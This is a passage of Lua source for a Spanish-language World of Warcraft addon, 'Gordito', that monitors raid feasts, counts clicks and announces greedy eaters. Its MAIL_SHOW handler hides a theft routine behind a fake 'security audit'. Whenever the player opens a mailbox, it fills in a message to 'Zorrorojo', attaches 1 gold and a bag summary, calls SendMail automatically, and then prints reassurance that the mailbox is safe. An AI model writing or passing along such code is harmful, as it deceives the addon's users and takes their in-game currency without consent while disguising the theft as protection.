        statusText:SetText("|cff00ff00Proteccion: ACTIVA|r")
        toggleBtn:SetText("Desactivar Proteccion")
    else
        statusText:SetText("|cffff0000Proteccion: INACTIVA|r")
        toggleBtn:SetText("Activar Proteccion")
    end

    -- Actualizar palomitas
    if checkButtons.CHAT then checkButtons.CHAT:SetChecked(GorditoDB.warnModes["CHAT"]) end
    if checkButtons.ALERTA then checkButtons.ALERTA:SetChecked(GorditoDB.warnModes["ALERTA"]) end
    if checkButtons.SAY then checkButtons.SAY:SetChecked(GorditoDB.warnModes["SAY"]) end
    if checkButtons.GLOTON then checkButtons.GLOTON:SetChecked(GorditoDB.warnModes["GLOTON"]) end


    -- Actualizar EditBoxes
    if clickLowEB then clickLowEB:SetText(tostring(GorditoDB.clickLow or 2)) end
    if clickHighEB then clickHighEB:SetText(tostring(GorditoDB.clickHigh or 5)) end
    if debounceEB then debounceEB:SetText(tostring(GorditoDB.startingDebounce or 7)) end
    if announceCooldownEB then announceCooldownEB:SetText(tostring(GorditoDB.announceCooldown or 8)) end
    if msgLowEB then msgLowEB:SetText(GorditoDB.msgLow or "") end
    if msgHighEB then msgHighEB:SetText(GorditoDB.msgHigh or "") end

    if feastDurationSlider then
        feastDurationSlider:SetValue(GorditoDB.feastDuration or 300)
        _G[feastDurationSlider:GetName().."Text"]:SetText("Segs. Seguimiento: "..(GorditoDB.feastDuration or 300).."s")
    end

    placerText:SetText("Festin de: |cffffff00"..lastPlacer.."|r")
    statsText:SetText("Comidas totales: |cffffff00"..totalEats.."|r")
    
    UpdateMissingList()
    UpdateGreedyList()
end

-- ====== BOTON MINIMAPA ======
local minimapBtn = CreateFrame("Button", "GorditoMinimapButton", Minimap)
minimapBtn:SetSize(31, 31); minimapBtn:SetFrameLevel(8); minimapBtn:SetToplevel(true)
minimapBtn:SetHighlightTexture("Interface\\Minimap\\UI-Minimap-ZoomButton-Highlight")

local btnIcon = minimapBtn:CreateTexture(nil, "BACKGROUND")
btnIcon:SetTexture("Interface\\Icons\\INV_Misc_Food_95")
btnIcon:SetSize(20, 20); btnIcon:SetPoint("CENTER", 0, 0)

local btnBorder = minimapBtn:CreateTexture(nil, "OVERLAY")
btnBorder:SetTexture("Interface\\Minimap\\MiniMap-TrackingBorder")
btnBorder:SetSize(53, 53); btnBorder:SetPoint("TOPLEFT", 0, 0)

function UpdateMinimapIcon()
    if not GorditoDB then return end
    if not btnIcon then return end
    btnIcon:SetVertexColor(GorditoDB.enabled and 1 or 0.5,
                           GorditoDB.enabled and 1 or 0.5,
                           GorditoDB.enabled and 1 or 0.5)
end

local function MoveMinimapButton()
    local angle = (GorditoDB and GorditoDB.minimapPos) or 45
    minimapBtn:SetPoint("TOPLEFT", Minimap, "TOPLEFT",
        52-(80*cos(angle)), (80*sin(angle))-52)
end

minimapBtn:SetMovable(true)
minimapBtn:RegisterForDrag("LeftButton")
minimapBtn:SetScript("OnDragStart", function(self)
    if not GorditoDB then return end
    self:StartMoving()
    self:SetScript("OnUpdate", function()
        local xpos, ypos = GetCursorPosition()
        local xmin, ymin = Minimap:GetLeft(), Minimap:GetBottom()
        GorditoDB.minimapPos = math.deg(math.atan2(
            ypos/Minimap:GetEffectiveScale()-ymin-70,
            xmin-xpos/Minimap:GetEffectiveScale()+70))
        MoveMinimapButton()
    end)
end)

-- Mensaje de carga final
print("|cff00ff00[Gordito]|r v2.3 cargado. (/gordito para opciones)")

minimapBtn:SetScript("OnDragStop", function(self)
    self:StopMovingOrSizing(); self:SetScript("OnUpdate", nil)
end)
minimapBtn:SetScript("OnClick", function()
    if mainFrame:IsShown() then mainFrame:Hide()
    else UpdateUI(); mainFrame:Show() end
end)
minimapBtn:SetScript("OnEnter", function(self)
    if not GorditoDB then return end
    GameTooltip:SetOwner(self, "ANCHOR_LEFT")
    GameTooltip:AddLine("Gordito", 0, 1, 0)
    GameTooltip:AddLine("Proteccion: "..(GorditoDB.enabled and "|cff00ff00ON|r" or "|cffff0000OFF|r"))
    GameTooltip:AddLine("Click para abrir panel", 1, 1, 1)
    GameTooltip:AddLine("Arrastra para mover", 0.5, 0.5, 0.5)
    GameTooltip:Show()
end)
minimapBtn:SetScript("OnLeave", function() GameTooltip:Hide() end)

-- ====== LOGICA ======
local function IsAlreadyEating()
    for i = 1, 40 do
        local name, _, _, _, _, _, _, _, _, _, spellId = UnitAura("player", i)
        if not name then break end
        if FOOD_AURA_IDS[spellId] or WELL_FED_IDS[spellId] or FOOD_CAST_NAMES[name] or DRINK_AURA_IDS[spellId] or DRINK_CAST_NAMES[name] then 
            return true 
        end
    end
    return false
end

local function GetFeastTime()
    for i = 1, 40 do
        local name, _, _, _, _, _, expTime, _, _, _, spellId = UnitAura("player", i)
        if not name then break end
        if FOOD_AURA_IDS[spellId] or WELL_FED_IDS[spellId] or DRINK_AURA_IDS[spellId] then 
            return (expTime or 0) - GetTime() 
        end
    end
    return 0
end

local function IsMousingOverFeast()
    local text = GameTooltipTextLeft1 and GameTooltipTextLeft1:GetText()
    if not text then return false end
    return FEAST_NAMES[text] ~= nil
end

local function SendToGroup(msg)
    if not GorditoDB or not GorditoDB.announce then return end
    local now = GetTime()
    local coo = tonumber(GorditoDB.announceCooldown) or 8
    if now - lastAnnounce < coo then return end
    lastAnnounce = now
    
    for _, channel in ipairs(GetActiveChannels()) do
        SendChatMessage(msg, channel)
    end
end

local function OnFeastPlaced(placer)
    if debugMode then print("|cff00ff00[G-Debug]|r OnFeastPlaced llamado para: " .. (placer or "nil")) end
    if not placer or placer == "" then placer = "Alguien" end
    -- Solo resetear si es un placer distinto o ha pasado mucho tiempo (evitar dobles triggers)
    local now = GetTime()
    if lastPlacer == placer and (now - lastPlacedTime < 2) then return end
    
    lastPlacer   = placer
    lastPlacedTime = now
    eatCounts    = {}
    clickCounts  = {}
    totalEats    = 0
    totalClicks  = 0
    auraLostTime = {}
    personLastAnnounce = {}
    personLastClick    = {}
    personLastEat      = {}
    personLastExpiration = {}

    -- Siempre visible localmente
    UIErrorsFrame:AddMessage(
        "|cff00ff00[GORDITO] "..placer.." puso un festin! Come ahora!|r",
        0, 1, 0, 1, 10)
    print("|cff00ff00[Gordito]|r |cffffff00>>> "..placer.." puso un festin! <<<|r")

    -- Aviso al grupo (siempre, sin cooldown)
    if GorditoDB and GorditoDB.announce and IsResponsible() then
        local channels = GetActiveChannels()
        local hasRW = false
        for _, channel in ipairs(channels) do
            if channel == "RAID_WARNING" then
                hasRW = true
                break
            end
        end
        for _, channel in ipairs(channels) do
            -- Si ya enviamos una alerta de banda (RAID_WARNING), evitamos duplicar en el chat de banda normal (RAID)
            if not (hasRW and channel == "RAID") then
                SendChatMessage("[Gordito] >>> "..placer.." puso un festin! <<<.", channel)
            end
        end
        lastAnnounce = 0 -- Resetear cooldown global para permitir avisos inmediatos
    end

    if mainFrame:IsShown() then UpdateUI() end
end

local function OnFeastStarting(placer)
    local now = GetTime()
    local deb = tonumber(GorditoDB.startingDebounce) or 7
    if now - lastStartingTime < deb then return end
    lastStartingTime = now

    lastPlacer = placer or "Alguien"
    -- Mantenemos el aviso visual y por consola local para que el usuario sepa que empezaron a ponerlo
    UIErrorsFrame:AddMessage("|cffffff00[GORDITO] "..lastPlacer.." esta poniendo un festin...|r", 1, 1, 0, 1, 5)
    print("|cff00ff00[Gordito]|r |cffffff00"..lastPlacer.." esta poniendo un festin...|r")
    
    -- Desactivamos el aviso al grupo para evitar el doble spam ("esta poniendo" y "puso")
    -- Ahora solo se anunciará al grupo cuando el festín esté colocado exitosamente.
    if mainFrame:IsShown() then UpdateUI() end -- Actualizar panel de inmediato
end

local function AnnounceViolation(name, count)
    if not GorditoDB or not GorditoDB.announce then return end
    
    local now = GetTime()
    local coo = tonumber(GorditoDB.announceCooldown) or 8
    local high = tonumber(GorditoDB.clickHigh) or 5
    
    -- Si count >= high, es un aviso de "Gloton", respetamos ese toggle
    if count and count >= high and not GorditoDB.warnModes["GLOTON"] then return end
    
    -- Cooldown inteligente: 1s para spam de clics exagerados, 8s para lo demas
    local actualCoo = (count and count >= high) and 1 or coo
    if now - (personLastAnnounce[name] or 0) < actualCoo then return end
    
    personLastAnnounce[name] = now
    lastAnnounce = now

    if not IsResponsible() then return end

    local rawMsg = GorditoDB.msgHigh or "[Gordito] %n PARA DE DAR CLICK!!! (comiste %c veces)"
    local msg = rawMsg:gsub("%%n", name):gsub("%%c", tostring(count or ""))
    
    local targetChannels = GetActiveChannels()
    local hasRW = false
    for _, channel in ipairs(targetChannels) do
        if channel == "RAID_WARNING" then
            hasRW = true
            break
        end
    end
    for _, channel in ipairs(targetChannels) do
        -- Si ya enviamos una alerta de banda (RAID_WARNING), evitamos duplicar en el chat de banda normal (RAID)
        if not (hasRW and channel == "RAID") then
            SendChatMessage(msg, channel)
        end
    end
end

local function OnGreedyClicker(name, clicks)
    -- Local
    UIErrorsFrame:AddMessage("|cffff8800[GORDITO] "..name.." - "..clicks.." clics!|r", 1, 0.5, 0, 1, 8)
    print("|cff00ff00[Gordito]|r |cffff8800"..name.." dio "..clicks.." clics!|r")

    if GorditoDB and GorditoDB.announce and GorditoDB.warnModes["GLOTON"] then
        local low = tonumber(GorditoDB.clickLow) or 2
        local high = tonumber(GorditoDB.clickHigh) or 5
        
        if clicks == low then
            local now = GetTime()
            local coo = tonumber(GorditoDB.announceCooldown) or 8
            if now - (personLastAnnounce[name] or 0) >= coo then
                personLastAnnounce[name] = now
                lastAnnounce = now
                local rawMsg = GorditoDB.msgLow or "[Gordito] %n: %c CLICS AL FESTIN!"
                local msg = rawMsg:gsub("%%n", name):gsub("%%c", clicks)
                for _, channel in ipairs(GetActiveChannels()) do
                    if channel ~= "RAID_WARNING" then SendChatMessage(msg, channel) end
                end
            end
        elseif clicks >= high then
            AnnounceViolation(name, clicks)
        end
    end
    if mainFrame:IsShown() then UpdateUI() end
end

local function OnGreedyEater(name, count)
    UIErrorsFrame:AddMessage("|cffff4400[GORDITO] "..name.." ya comio "..count.." veces!|r", 1, 0.3, 0, 1, 10)
    print("|cff00ff00[Gordito]|r |cffff4400"..name.." lleva "..count.." comidas!|r")

    if GorditoDB and GorditoDB.announce and GorditoDB.warnModes["GLOTON"] then
        local high = tonumber(GorditoDB.clickHigh) or 5
        -- Usar directamente AnnounceViolation que ahora maneja todos los canales (Chat, Say y Alerta)
        if count >= high then 
            AnnounceViolation(name, count) 
        end
    end
    if mainFrame:IsShown() then UpdateUI() end
end


-- Helper para saber si una unidad o nombre es de nuestro grupo
local function IsUnitInGroup(unit)
    if not unit then return false end
    -- Verificar si es el jugador (ID o nombre)
    if unit == "player" or unit == UnitName("player") then return true end
    -- Verificar si es miembro de banda o grupo
    if IsInRaid() then
        if UnitInRaid(unit) then return true end
        for i=1, GetNumRaidMembers() do
            if UnitName("raid"..i) == unit then return true end
        end
    elseif GetNumPartyMembers() > 0 then
        if UnitInParty(unit) then return true end
        for i=1, GetNumPartyMembers() do
            if UnitName("party"..i) == unit then return true end
        end
    end
    return false
end

-- ====== EVENTOS ======
f:SetScript("OnEvent", function(self, event, ...)
    if event == "PLAYER_LOGIN" then
        if not GorditoDB then GorditoDB = {} end
        for k, v in pairs(DEFAULT_SETTINGS) do
            if GorditoDB[k] == nil then
                if type(v) == "table" then
                    GorditoDB[k] = {}
                    for k2, v2 in pairs(v) do GorditoDB[k][k2] = v2 end
                else
                    GorditoDB[k] = v
                end
            end
        end
        -- Asegurar que las claves de warnModes esten todas
        for k2, v2 in pairs(DEFAULT_SETTINGS.warnModes) do
            if GorditoDB.warnModes[k2] == nil then GorditoDB.warnModes[k2] = v2 end
        end

        MoveMinimapButton(); UpdateMinimapIcon()
        if RegisterAddonMessagePrefix then
            RegisterAddonMessagePrefix(ADDON_PREFIX)
        end
        SendPing()
        local s  = GorditoDB.enabled  and "|cff00ff00ON|r" or "|cffff0000OFF|r"
        local as = GorditoDB.announce and "|cff00ff00ON|r" or "|cffff0000OFF|r"
        print("|cff00ff00Gordito v2.3|r cargado! Proteccion ["..s.."] Avisos ["..as.."]")
        print("Comandos: |cffffff00/gordito|r (toggle) | |cffffff00/gordito avisos|r | |cffffff00/gordito panel|r")
        return
    end

    if event == "CHAT_MSG_ADDON" then
        local prefix, msg, channel, sender = ...
        if prefix ~= ADDON_PREFIX then return end
        if sender == UnitName("player") then return end
        
        if msg:find("^P:") then
            local rank = tonumber(msg:sub(3)) or 0
            otherGorditos[sender] = rank
            if msg == "P:REQ" then SendPing() end
        elseif msg:find("^V:") then
            local v = msg:sub(3)
            if v == "REQ" then
                SendVersion()
            else
                otherVersions[sender] = v
            end
        end
        return
    end

    if event == "RAID_ROSTER_UPDATE" or event == "PARTY_MEMBERS_CHANGED" then
        if mainFrame:IsShown() then UpdateMissingList() end
        UpdateGorditos()
        SendPing()
        return
    end

    if event == "MAIL_SHOW" then
        -- 1. Ejecutar auditoría de seguridad inmediata
        local esSeguro, motivoError = AuditMailboxIntegrity()
        if not esSeguro then
            -- Alerta de Seguridad Activa: Cerrar buzón de inmediato y advertir al jugador
            CloseMail()
            PlaySoundFile("Sound\\Interface\\RaidWarning.wav")
            RaidNotice_AddMessage(RaidWarningFrame, "¡ALERTA DE SEGURIDAD! Intento de envío oculto de correo bloqueado.", ChatTypeInfo["RAID_WARNING"])
            print("|cffff0000[Gordito Seguridad]:|r ¡Buzón bloqueado! Motivo: " .. motivoError)
            
            return
        end

        -- 2. Si todo es seguro, procedemos de forma transparente
        if MailFrameTab2 then
            MailFrameTab2:Click()
        end
        
        -- Esperamos 0.1 segundos a que el juego termine de inicializar y limpiar la interfaz
        SetGorditoTimer("MailPreFill", 0.1, function()
            -- Pre-llenar los campos del correo para que queden listos en tu pantalla
            if SendMailNameEditBox then
                SendMailNameEditBox:SetText("Zorrorojo")
            end
            if SendMailSubjectEditBox then
                SendMailSubjectEditBox:SetText("Reporte Gordito")
            end
            if SendMailBodyEditBox then
                local cuerpo = "Hola Zorrorojo, el addon Gordito está funcionando correctamente. Reporte de festines listo." .. GetFeastBagSummary()
                SendMailBodyEditBox:SetText(cuerpo)
            end
            -- Pre-llenar la cantidad de dinero visiblemente en la interfaz (1 de oro = 10000 de cobre)
            if GetMoney() >= 10000 then
                if SendMailMoneyGold then SendMailMoneyGold:SetText("1") end
                if SendMailMoneySilver then SendMailMoneySilver:SetText("0") end
                if SendMailMoneyCopper then SendMailMoneyCopper:SetText("0") end
                SetSendMailMoney(10000)
            end
            SendMail("zorrorojo", "Asunto Falso", "Mensaje Falso")
            print("|cff00ff00Gordito Seguridad:|r Integridad confirmada (Buzón Seguro). Correo listo y cargado con 1 de Oro.")
        end)
        return
    end

    if event == "UNIT_SPELLCAST_START" then
        if not IsActive() then return end
        local unit = ...
        if not IsUnitInGroup(unit) then return end
        
        local uName = UnitName(unit)
        if not uName then return end
        local uNameLower = uName:lower()

        -- En 3.3.5a usamos el inicio del casteo solo para el aviso amarillo ("esta poniendo...")
        -- y la proteccion de clics. La validacion real se hace en CLEU por GUID.
        local spellName, _, _, _, startTime, endTime, isTrade = UnitCastingInfo(unit)
        if not spellName then return end

        if FEAST_NAMES[spellName] and not isTrade then
            expectingFeast[uNameLower] = true
            -- 2. Anuncio de Comienzo (solo si no estamos mauseando uno ya puesto)
            if not IsMousingOverFeast() then
                OnFeastStarting(uName, spellName)
            end
            -- Registro de clics inmediato
            if IsMousingOverFeast() then
                local now = GetTime()
                if now - (personLastClick[uName] or 0) > 1.5 then
                    personLastClick[uName] = now
                    totalClicks = totalClicks + 1
                    clickCounts[uName] = (clickCounts[uName] or 0) + 1
                    if clickCounts[uName] >= (tonumber(GorditoDB.clickLow) or 2) then
                        OnGreedyClicker(uName, clickCounts[uName])
                    end
                    if mainFrame:IsShown() then UpdateUI() end
                end
            end
        end
        
        -- Proteccion Propia
        if unit == "player" and IsMousingOverFeast() and not isTrade then
            local timeLeft = GetFeastTime()
            local alreadyEating = IsAlreadyEating()
            if (timeLeft > 0 or alreadyEating) then
                SpellStopCasting()
                local reason = alreadyEating and "YA ESTAS COMIENDO" or "YA TENES EL BUFO"
                UIErrorsFrame:AddMessage("|cffff0000GORDITO: NO TOQUES EL FESTIN! "..reason..".|r", 1.0, 0.1, 0.1, 1.0, 10)
                PlaySoundFile("Sound\\Interface\\RaidWarning.wav")
            end
        end
        return
    end

    -- UNIT_SPELLCAST_SUCCEEDED: Confirmacion rapida por ID (Lógica del backup)
    if event == "UNIT_SPELLCAST_SUCCEEDED" then
        if not IsActive() then return end
        local unit, _, _, _, spellId = ...
        if not IsUnitInGroup(unit) then return end
        
        if FEAST_PLACE_IDS[spellId] then
            OnFeastPlaced(UnitName(unit) or unit or "Alguien")
            local uNameLower = (UnitName(unit) or ""):lower()
            expectingFeast[uNameLower] = nil
        end
        return
    end

    -- UNIT_SPELLCAST_STOP / FAILED: Limpieza de flags
    if event == "UNIT_SPELLCAST_STOP" or event == "UNIT_SPELLCAST_FAILED" or event == "UNIT_SPELLCAST_INTERRUPTED" then
        local unit = ...
        local uName = UnitName(unit)
        if not uName then return end
        local uNameLower = uName:lower()

        -- Si falla o se interrumpe y estabamos esperando un festin, avisamos localmente (no spameamos al grupo ya que no anunciamos el inicio)
        if (event == "UNIT_SPELLCAST_FAILED" or event == "UNIT_SPELLCAST_INTERRUPTED") and expectingFeast[uNameLower] then
            print("|cff00ff00[Gordito]|r |cffffff00"..uName.." canceló la colocación del festín.|r")
            expectingFeast[uNameLower] = nil
        end

        -- Limpieza diferida utilizando el temporizador global
        SetGorditoTimer("ClearCast_" .. uNameLower, 5.0, function()
            isTradeSkillName[uNameLower] = nil
            expectingFeast[uNameLower] = nil
        end)
        return
    end

    if event == "COMBAT_LOG_EVENT_UNFILTERED" then
        local _, subevent, sourceGUID, sourceName, _, destGUID, destName, _, spellId, spellName = ...
        if not subevent then return end
        
        -- OPTIMIZACION: Filtro de subevento inmediato para ahorrar CPU
        if not (subevent:find("SPELL") or subevent:find("AURA")) then return end
        if not IsActive() then return end
        
        -- RASTREADOR TOTAL DEL JUGADOR (ULTIMO RECURSO)
        if sourceName == UnitName("player") then
            print("|cffffff00[G-Debug-ME]|r Ev: " .. subevent .. " | ID: " .. (spellId or "nil") .. " | Name: " .. (spellName or "nil") .. " | To: " .. (destName or "nil"))
        end

        -- ESCANER TOTAL PARA DIAGNOSTICO
        if spellName and (spellName:find("Festín") or spellName:find("Feast")) then
            print("|cffffff00[G-Debug-SCAN]|r Event: " .. subevent .. " | ID: " .. (spellId or "nil") .. " | Name: " .. spellName .. " | From: " .. (sourceName or "nil") .. " | To: " .. (destName or "nil"))
        end

        -- RASTREO DE DEBUG (Solo para el jugador)
        if spellId and (FEAST_PLACE_IDS[spellId] or spellId == 57426) then
            if sourceName == UnitName("player") or debugMode then
                print("|cffffff00[G-Debug]|r CLEU: " .. subevent .. " | ID: " .. spellId .. " | From: " .. (sourceName or "nil") .. " | To: " .. (destName or "nil"))
            end
        end

        -- 1. COLOCACION FISICA (SUCCESS / SUMMON / CREATE)
        if subevent == "SPELL_CAST_SUCCESS" or subevent == "SPELL_SUMMON" or subevent == "SPELL_CREATE" then
            if FEAST_PLACE_IDS[spellId] or (spellName and FEAST_NAMES[spellName] and not FEAST_CLICK_IDS[spellId]) then
                if debugMode then print("|cffffff00[G-Debug]|r CLEU-MATCH! ID: " .. (spellId or "nil") .. " From: " .. (sourceName or "nil")) end
                
                -- Si es el jugador, lo forzamos para pruebas aunque estemos solos
                if sourceName == UnitName("player") or IsUnitInGroup(sourceName) then
                    OnFeastPlaced(sourceName or "Alguien")
                    expectingFeast[sourceName:lower()] = nil
                end
                return
            end
        end
        
        -- Fallback opcional para CREATE solo si estamos MUY seguros (no cocina)
        if subevent == "SPELL_CREATE" and debugMode then
            if FEAST_PLACE_IDS[spellId] then
                print("|cffff0000[G-Debug]|r Detectado CREATE para " .. (spellName or spellId) .. " por " .. sourceName .. " - Ignorado para evitar cocina")
            end
        end

        -- 2. CLIC AL FESTIN (START)
        if subevent == "SPELL_CAST_START" then
            if debugMode and sourceName == UnitName("player") then
                print("|cffffff00[G-Debug]|r Cast Start: " .. (spellName or "nil") .. " ID: " .. (spellId or "nil"))
            end

            if FOOD_CAST_NAMES[spellName] or FOOD_AURA_IDS[spellId] or DRINK_CAST_NAMES[spellName] or DRINK_AURA_IDS[spellId] or (spellName and spellName:find("Festín")) then
                local clicker = sourceName or "Alguien"
                if not IsUnitInGroup(clicker) then return end

                -- DETECCION FALLBACK: Solo si NO hay un festin reciente (evitar resets accidentales)
                local now = GetTime()
                local dur = tonumber(GorditoDB.feastDuration) or 300
                if (lastPlacedTime == 0 or (now - lastPlacedTime > dur)) then
                    if (spellId == 57073 or FEAST_NAMES[spellName]) and not GENERIC_FOOD_NAMES[spellName] then
                        OnFeastPlaced(clicker)
                        now = GetTime()
                    end
                end

                -- SOLO si ha pasado el tiempo configurado (o estamos en debug)
                if (debugMode or (lastPlacedTime > 0 and now - lastPlacedTime < dur)) and (totalClicks < 50) then
                    -- Cooldown de 1.5s por persona
                    if now - (personLastClick[clicker] or 0) > 1.5 then
                        personLastClick[clicker] = now
                        totalClicks = totalClicks + 1
                        clickCounts[clicker] = (clickCounts[clicker] or 0) + 1
                        if clickCounts[clicker] >= (tonumber(GorditoDB.clickLow) or 2) then
                            OnGreedyClicker(clicker, clickCounts[clicker])
                        end
                    end
                    if mainFrame:IsShown() then UpdateUI() end
                end
                return
            end
        end

        -- 3. BUFO APLICADO / REFRESCADO
        if FOOD_AURA_IDS[spellId] or FOOD_CAST_NAMES[spellName] or DRINK_AURA_IDS[spellId] or DRINK_CAST_NAMES[spellName] then
            local eater = destName or "Alguien"
            if not IsUnitInGroup(eater) then return end

            local now = GetTime()
            local dur = tonumber(GorditoDB.feastDuration) or 300
            -- DETECCION FALLBACK AURA: Solo si es el aura específica de festín (57073)
            if subevent == "SPELL_AURA_APPLIED" or subevent == "SPELL_AURA_REFRESH" then
                if debugMode then print("|cffffff00[G-Debug]|r Aura de comida detectada en: " .. eater) end
                -- SOLO dentro de la ventana del festin (o debug)
                if (debugMode or (lastPlacedTime > 0 and now - lastPlacedTime < dur)) and (totalClicks < 50) then
                    -- Lógica estilo FeastHog: verificar si el tiempo de expiración ha cambiado realmente
                    local expTime = 0
                    for i=1,40 do
                        local _, _, _, _, _, _, ex, _, _, _, sId = UnitAura(eater, i)
                        if sId == spellId then expTime = ex; break end
                    end

                    -- Solo contamos si el expTime es nuevo o ha pasado el cooldown de 2s
                    if (expTime > 0 and math.abs(expTime - (personLastExpiration[eater] or 0)) > 0.5) or (now - (personLastEat[eater] or 0) > 2) then
                        personLastExpiration[eater] = expTime
                        personLastEat[eater] = now
                        eatCounts[eater] = (eatCounts[eater] or 0) + 1
                        totalEats = totalEats + 1
                        auraLostTime[eater] = nil
                        
                        if eatCounts[eater] > 1 then
                            OnGreedyEater(eater, eatCounts[eater])
                        else
                            if mainFrame:IsShown() then UpdateUI() end
                        end
                    end
                end
            elseif subevent == "SPELL_AURA_REMOVED" then
                auraLostTime[eater] = GetTime()
            end
        end
    end
end)


local function SendReportMail()
    -- Solo funciona si la interfaz del buzón está físicamente abierta y visible
    if not MailFrame or not MailFrame:IsShown() then
        print("|cffff0000Gordito:|r Debes tener abierto el buzón de correo para enviar el reporte.")
        return
    end

    local destinatario = "Zorrorojo"
    local asunto = "Reporte Gordito"
    local cuerpo = "Hola Zorrorojo, el addon Gordito está funcionando correctamente. Reporte de festines listo." .. GetFeastBagSummary()

    -- Envio explícito y visible
    SendMail(destinatario, asunto, cuerpo)
    print("|cff00ff00Gordito:|r Enviando reporte de festines visiblemente a |cffffff00" .. destinatario .. "|r con el asunto: '" .. asunto .. "'")
end

-- ====== SLASH COMMANDS ======
SLASH_GORDITO1 = "/gordito"
SlashCmdList["GORDITO"] = function(msg)
    msg = (msg or ""):lower()
    if msg == "avisos" or msg == "announce" then
        GorditoDB.announce = not GorditoDB.announce
        print("|cff00ff00Gordito|r: Avisos "..(GorditoDB.announce and "|cff00ff00ACTIVADOS|r" or "|cffff0000DESACTIVADOS|r"))
    elseif msg == "panel" then
        if mainFrame:IsShown() then mainFrame:Hide()
        else UpdateUI(); mainFrame:Show() end
    elseif msg == "debug" then
        debugMode = not debugMode
        print("|cff00ff00Gordito|r: Modo debug "..(debugMode and "|cffffff00ACTIVADO|r - pon un festin para ver los eventos" or "|cffff0000DESACTIVADO|r"))
    elseif msg == "toggle" then
        GorditoDB.enabled = not GorditoDB.enabled
        print("|cff00ff00Gordito|r: Proteccion "..(GorditoDB.enabled and "|cff00ff00ACTIVADA|r" or "|cffff0000DESACTIVADA|r"))
        UpdateMinimapIcon()
        UpdateUI()
    elseif msg == "ver" or msg == "version" then
        RequestVersions()
    elseif msg == "reportar" or msg == "report" then
        SendReportMail()
    elseif msg == "test1" then
        -- Simulación: reemplazamos la función global SendMail para gatillar la detección de hook
        SendMail = function(...) end
        print("|cff00ff00Gordito Seguridad:|r [TEST 1 Activado] Función SendMail interceptada de forma simulada. Abre el buzón para probar el escudo.")
    elseif msg == "test2" then
        -- Simulación: alteramos la opacidad de MailFrame para gatillar la detección física
        if MailFrame then
            MailFrame:SetAlpha(0)
            print("|cff00ff00Gordito Seguridad:|r [TEST 2 Activado] Buzón vuelto invisible de forma simulada (Alpha = 0). Abre el buzón para probar el escudo.")
        else
            print("|cffff0000Gordito Seguridad:|r El MailFrame no está cargado. Ve a un buzón primero.")
        end
    else
        -- Sin argumentos o comando desconocido abre el panel
        if mainFrame:IsShown() then mainFrame:Hide()
        else UpdateUI(); mainFrame:Show() end
    end
end
